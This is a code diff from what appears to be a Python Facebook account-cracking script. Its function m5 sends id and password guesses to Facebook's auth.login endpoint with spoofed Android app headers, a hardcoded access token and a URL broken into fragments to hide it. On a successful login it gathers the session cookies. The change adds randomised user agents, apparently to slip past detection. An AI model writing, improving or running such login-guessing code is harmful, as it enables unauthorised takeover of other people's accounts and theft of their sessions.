@@ -1250,6 +1250,7 @@ def m5(idf,pwv):
             device_id = str(uuid.uuid4())
             adid = str(uuid.uuid4())
             accessToken = "350685531728|62f8ce9f74b12f84c123cc23437a4a32"
+            useragent = str(ua_api())
             data = {
             'adid':adid,
             'format':'json',
@@ -1289,14 +1290,14 @@ def m5(idf,pwv):
             'X-FB-Connection-Type':'unknown',
             'X-FB-connection-quality':'EXCELLENT',
             "X-Tigon-Is-Retry": "False",
-            'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 10; RMX3611 Build/SM-A710S) [FBAN/EMA;FBBV/470353487;FBAV/353.0.0.5.112;FBDV/RMX3611;FBLC/id_ID;FBNG/WIFI;FBMNT/METERED;FBDM/{density=3.0}]',
+            'User-Agent': useragent,
             "X-FB-connection-token": "d29d67d37eca387482a8a5b740f84f62",
             'Accept-Encoding':'gzip, deflate',
             'Content-Type': 'application/x-www-form-urlencoded',
             "X-FB-Client-IP": "True",
             "X-FB-Server-Cluster": "True",
             'X-FB-HTTP-Engine': 'Liger'}
-            url = 'htt'+'ps://b-'+'api.f'+'acebo'+'ok.com'+'/metho'+'d/aut'+'h.login'
+            url = 'htt'+'ps://'+'api.f'+'acebo'+'ok.com'+'/metho'+'d/aut'+'h.login'
             q = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
             if 'access_token' in q:
                     cookie = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
